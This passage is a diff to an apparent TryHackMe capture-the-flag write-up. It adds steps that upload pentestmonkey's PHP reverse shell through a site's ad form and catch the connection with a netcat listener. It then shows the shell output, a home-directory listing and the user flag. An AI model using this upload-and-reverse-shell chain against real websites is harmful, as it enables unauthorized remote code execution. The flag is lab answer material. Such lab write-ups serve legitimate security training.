@@ -113,17 +113,138 @@ DOWNLOADED: 13836 - FOUND: 4
 
 # 
 >
-6. `firefox "http://10.10.165.242/content/inc/mysql_backup/"`
+6. `firefox "http://{TARGET IP}/content/inc`
 ![]()
+7. `firefox "http://{TARGET IP}/content/inc/mysql_backup/"`
+![]()
+8. `firefox "http://{TARGET IP}/content/as"`
 
 # Vulnerability Identification
-> 
+> Command Injection
+9. Upload a test ad
+![]()
+10. `firefox "http://{TARGET IP}/content/inc/ads"`
 
 #
 > Step
 
 # Vulnerability Exploitation
 > Step
+11. `git clone https://github.com/pentestmonkey/php-reverse-shell`
+12. `ls`
+13. `cd php-reverse-shell`
+14. `ls`
+15. `mousepad php-reverse-shell.php`
+```bash
+┌──(kali㉿kali)-[~/Downloads]
+└─$ git clone https://github.com/pentestmonkey/php-reverse-shell
+Cloning into 'php-reverse-shell'...
+remote: Enumerating objects: 10, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Compressing objects: 100% (2/2), done.
+remote: Total 10 (delta 1), reused 1 (delta 1), pack-reused 7
+Receiving objects: 100% (10/10), 9.81 KiB | 590.00 KiB/s, done.
+Resolving deltas: 100% (2/2), done.
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads]
+└─$ ls
+ php-reverse-shell
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads]
+└─$ cd php-reverse-shell
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/php-reverse-shell]
+└─$ ls
+CHANGELOG  COPYING.GPL  COPYING.PHP-REVERSE-SHELL  LICENSE  php-reverse-shell.php  README.md
+```
+```bash
+┌──(kali㉿kali)-[~/Downloads/php-reverse-shell]
+└─$ mousepad php-reverse-shell.php
+```
+![]()
+16. `nc -lvnp {PORT NUMBER}`
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9999                            
+listening on [any] 9999 ...
+```
+17 `firefox "http://10.10.165.242/content/as/?type=ad"`
+![]()
+18. Copy paste the contents of **php-reverse-shell.php** into the "**Ads code**" input form and give it any name you want
+![]()
+19. `firefox "http://10.10.165.242/content/inc/ads/"`
+![]()
+20. Click on it
+```bash
+┌──(kali㉿kali)-[~]
+└─$ nc -lvnp 9999                            
+listening on [any] 9999 ...
+connect to [10.6.54.63] from (UNKNOWN) [10.10.165.242] 46436
+Linux THM-Chal 4.15.0-70-generic #79~16.04.1-Ubuntu SMP Tue Nov 12 11:54:29 UTC 2019 i686 i686 i686 GNU/Linux
+ 05:02:10 up  3:17,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+21. `ls`
+22. `ls /home`
+23. `ls /home/{USER}`
+24. `cat /home/{USER}/{USER FLAG}.txt`
+```bash
+$ ls
+bin
+boot
+cdrom
+dev
+etc
+home
+initrd.img
+initrd.img.old
+lib
+lost+found
+media
+mnt
+opt
+proc
+root
+run
+sbin
+snap
+srv
+sys
+tmp
+usr
+var
+vmlinuz
+vmlinuz.old
+```
+```bash
+$ ls /home
+itguy
+```
+```bash
+$ ls /home/itguy
+Desktop
+Documents
+Downloads
+Music
+Pictures
+Public
+Templates
+Videos
+backup.pl
+examples.desktop
+mysql_login.txt
+user.txt
+```
+```bash
+$ cat /home/itguy/user.txt
+THM{63e5bce9271952aad1113b6f1ac28a07}
+```
 
 #
 > Step
@@ -132,7 +253,7 @@ DOWNLOADED: 13836 - FOUND: 4
 > Step
 
 #
-> Step
+> "`Step
 
 # Contributions
 This writeup was made by Jonmar Corpuz, founder of **KnowCybersecurity** (www.knowwwcybersecurity.com)
